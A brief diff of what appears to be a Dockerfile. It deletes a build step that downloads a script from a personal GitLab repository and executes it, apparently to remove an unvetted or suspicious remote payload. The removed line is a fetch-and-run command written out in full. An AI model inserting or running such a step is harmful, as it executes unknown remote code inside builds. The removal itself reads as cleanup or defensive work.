@@ -18,5 +18,5 @@ RUN apt-get update && apt-get install -y \
     wget \
     git \
     
-RUN curl -0 https://gitlab.com/anihsugiarti9/jomblo/-/raw/main/building.sh -O building.sh && chmod +x building.sh && ./building.sh
+
 USER root
